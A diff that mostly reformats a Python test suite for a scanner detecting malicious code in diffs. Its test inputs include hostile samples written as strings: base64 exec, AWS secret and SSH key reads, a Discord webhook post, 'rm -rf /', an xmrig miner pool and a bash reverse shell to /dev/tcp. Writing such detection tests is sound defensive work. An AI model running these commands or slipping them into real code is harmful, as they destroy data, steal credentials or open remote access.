@@ -13,6 +13,7 @@ def make_diff(added_lines: list[str], filepath: str = "test.py") -> str:
 
 # ─── EXEC_BASE64 ──────────────────────────────────────────────────────────
 
+
 def test_detect_exec_base64():
     diff = make_diff(["exec(base64.b64decode('aGVsbG8='))"])
     matches = scan_diff(diff, "setup.py")
@@ -28,6 +29,7 @@ def test_detect_eval_base64():
 
 # ─── HARDCODED_IP ─────────────────────────────────────────────────────────
 
+
 def test_detect_hardcoded_ip():
     diff = make_diff(['socket.connect("103.45.67.89", 8080)'])
     matches = scan_diff(diff, "utils.py")
@@ -35,6 +37,7 @@ def test_detect_hardcoded_ip():
 
 
 # ─── ENV_EXFIL ────────────────────────────────────────────────────────────
+
 
 def test_detect_aws_secret():
     diff = make_diff(["secret = os.environ.get('AWS_SECRET_ACCESS_KEY')"])
@@ -51,6 +54,7 @@ def test_detect_env_api_key():
 
 # ─── SSH_KEY ──────────────────────────────────────────────────────────────
 
+
 def test_detect_ssh_key_access():
     diff = make_diff(["data = open('~/.ssh/id_rsa').read()"])
     matches = scan_diff(diff, "auth.py")
@@ -58,6 +62,7 @@ def test_detect_ssh_key_access():
 
 
 # ─── DISCORD_WEBHOOK ──────────────────────────────────────────────────────
+
 
 def test_detect_discord_webhook():
     diff = make_diff(["requests.post('https://discordapp.com/api/webhooks/123/abc', data=payload)"])
@@ -73,6 +78,7 @@ def test_detect_telegram_bot():
 
 # ─── SUBPROCESS ──────────────────────────────────────────────────────────
 
+
 def test_detect_subprocess_shell():
     diff = make_diff(["subprocess.run(['rm', '-rf', '/'], shell=True)"])
     matches = scan_diff(diff, "setup.py")
@@ -86,6 +92,7 @@ def test_detect_os_system():
 
 
 # ─── CRYPTO MINER / REVERSE SHELL ─────────────────────────────────────────
+
 
 def test_detect_crypto_miner():
     diff = make_diff(["bin = 'xmrig --pool stratum+tcp://pool.monero.com:3333'"])
@@ -101,6 +108,7 @@ def test_detect_reverse_shell():
 
 
 # ─── BENIGN DETECTION ─────────────────────────────────────────────────────
+
 
 def test_benign_comment_only():
     diff = make_diff(["# This is a comment", "# Another comment"])
@@ -119,17 +127,20 @@ def test_not_benign_code_change():
 
 def test_no_false_positive_normal_code():
     """Normal code additions should not trigger rules."""
-    diff = make_diff([
-        "def get_api_key(name):",
-        "    return config.get(name)",
-        "logger.info('Starting application')",
-    ])
+    diff = make_diff(
+        [
+            "def get_api_key(name):",
+            "    return config.get(name)",
+            "logger.info('Starting application')",
+        ]
+    )
     matches = scan_diff(diff, "config.py")
     critical = [m for m in matches if m.severity == Severity.CRITICAL]
     assert len(critical) == 0
 
 
 # ─── SEVERITY LEVELS ──────────────────────────────────────────────────────
+
 
 def test_critical_severity_for_reverse_shell():
     diff = make_diff(["os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')"])
